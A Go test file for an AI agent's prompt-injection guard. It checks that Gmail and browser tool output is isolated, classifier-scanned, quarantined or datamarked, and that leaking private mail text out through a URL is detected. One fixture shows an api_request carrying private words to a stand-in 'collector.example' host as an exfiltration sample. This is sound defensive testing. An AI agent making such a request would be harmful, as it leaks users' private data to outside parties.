package agent

import (
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"strings"
	"testing"

	"aurago/internal/config"
	"aurago/internal/memory"
	"aurago/internal/security"
	"github.com/sashabaranov/go-openai"
)

func TestInjectionGuardWorkspaceMailRecordsExternalContact(t *testing.T) {
	for _, operation := range []string{"gmail_read", "gmail_list", "drive_list", ""} {
		t.Run(operation, func(t *testing.T) {
			id := t.Name()
			defer clearIsolatedModelBodies(id)
			recordIsolatedModelOutput(id, "google_workspace", operation, isolatedToolOutput("Private alpha bravo charlie delta."))
			_, _, contact := modelIsolatedBodies.privateURLContext(id)
			call := ToolCall{Action: "api_request", Params: map[string]interface{}{"url": "https://collector.example/?q=alpha+bravo+charlie+delta"}}
			want := operation != "drive_list"
			if contact != want || privateURLExfiltration(call, &DispatchContext{SessionID: id}) != want {
				t.Fatal("Workspace operation lost its trusted source", operation, contact)
			}
		})
	}
}

func TestInjectionGuardWorkspaceArchivesUseStoredOperation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	stm, err := memory.NewSQLiteMemory(":memory:", logger)
	if err != nil {
		t.Fatal(err)
	}
	defer stm.Close()
	scanner := &integrationGuardScanner{}
	defer security.RegisterExternalContentScanner(scanner)()
	for _, operation := range []string{"gmail_read", "drive_list", ""} {
		id := t.Name() + operation
		defer clearIsolatedModelBodies(id)
		err := stm.StoreCompressedOutput(context.Background(), &memory.CompressedToolOutput{SessionID: id, ToolCallID: "call", OutputRef: "ref", ToolName: "google_workspace", ToolOperation: operation, OriginalContent: "Private alpha bravo charlie delta.", CompressedContent: "compact", FilterUsed: "vault"})
		if err != nil {
			t.Fatal(err)
		}
		dc := &DispatchContext{Cfg: &config.Config{}, Logger: logger, ShortTermMem: stm, SessionID: id}
		before := len(scanner.seen)
		outputs := []string{
			handleReadToolOutput(context.Background(), ToolCall{Params: map[string]interface{}{"ref": "ref", "max_chars": 300}}, dc),
			handleRetrieveOriginalOutput(context.Background(), ToolCall{Params: map[string]interface{}{"tool_call_id": "call"}}, dc),
		}
		wantCalls := 2
		if operation == "drive_list" {
			wantCalls = 0
		}
		if len(scanner.seen)-before != wantCalls {
			t.Errorf("operation %q: classifier calls=%d, want %d", operation, len(scanner.seen)-before, wantCalls)
		}
		for _, output := range outputs {
			if strings.Contains(output, "QUARANTINE") != (wantCalls > 0) || strings.Contains(output, "Private alpha") != (wantCalls == 0) {
				t.Errorf("operation %q: wrong archive verdict: %s", operation, output)
			}
		}
	}
}

func TestInjectionGuardOutputVaultStoresWorkspaceOperation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	stm, err := memory.NewSQLiteMemory(":memory:", logger)
	if err != nil {
		t.Fatal(err)
	}
	defer stm.Close()
	cfg := &config.Config{}
	cfg.Agent.ToolOutputLimit = 50000
	cfg.Agent.OutputCompression.Reversible.Enabled = true
	cfg.Agent.OutputCompression.Reversible.PrimaryOutputVault = true
	cfg.Agent.OutputCompression.Reversible.MaxInlineChars = 300
	call := ToolCall{Action: "google_workspace", Operation: "gmail_read", NativeCallID: "mail-call"}
	state := newToolRecoveryState()
	result := finalizeToolExecution(context.Background(), call, isolatedToolOutput(strings.Repeat("ordinary mail text\n", 300)), false, cfg, stm, t.Name(), &state, &openai.ChatCompletionRequest{}, logger, AgentTelemetryScope{}, "v1", 100, RunConfig{}, inlineBudgetBasis{})
	archived, err := stm.RetrieveCompressedOutputByRef(context.Background(), t.Name(), result.OutputRef)
	if err != nil || archived.ToolOperation != "gmail_read" || archived.ToolName != "google_workspace" {
		t.Fatalf("operation lost during real archival: output=%+v err=%v", archived, err)
	}
}

type datamarkRegressionScanner struct{}

func (datamarkRegressionScanner) Evaluate(context.Context, string) (float64, string, bool, error) {
	return .9, "datamark", true, nil
}

func TestInjectionGuardDatamarkBrowserDispatchPreservesPathAndOutcome(t *testing.T) {
	defer security.RegisterExternalContentScanner(datamarkRegressionScanner{})()
	calls := 0
	dc := actionSecurityFixture(t, func(ctx context.Context, _ ToolCall) (string, bool) {
		calls++
		return formatBrowserAutomationOutput(ctx, `{"status":"success","screenshot_rel_path":"captures/My Screenshot.png","text":"Ordinary page text."}`), true
	})
	defer clearIsolatedModelBodies(dc.SessionID)
	dc.Cfg.Agent.ActionPolicy.Enabled = false
	dc.Cfg.BrowserAutomation.Enabled = true
	dc.Cfg.Tools.BrowserAutomation.Enabled = true
	call := ToolCall{Action: "browser_automation", Operation: "screenshot", Params: map[string]interface{}{"operation": "screenshot", "session_id": "fixture"}}
	result := DispatchToolCallResult(context.Background(), &call, dc, "take a screenshot")
	payload, isolated := toolResultPayload(result.Output)
	var body map[string]interface{}
	for depth := 0; depth < 4 && !json.Valid([]byte(payload)); depth++ {
		inner, wrapped := toolResultPayload(payload)
		if !wrapped {
			break
		}
		payload = inner
	}
	if calls != 1 || result.Status != ToolResultSuccess || !isolated || json.Unmarshal([]byte(payload), &body) != nil {
		t.Fatalf("unexpected browser result: calls=%d result=%+v", calls, result)
	}
	if body["screenshot_rel_path"] != "captures/My Screenshot.png" || body["text"] != "Ordinary^page^text." {
		t.Fatal("dispatch damaged machine fields or failed to mark prose", payload)
	}
}
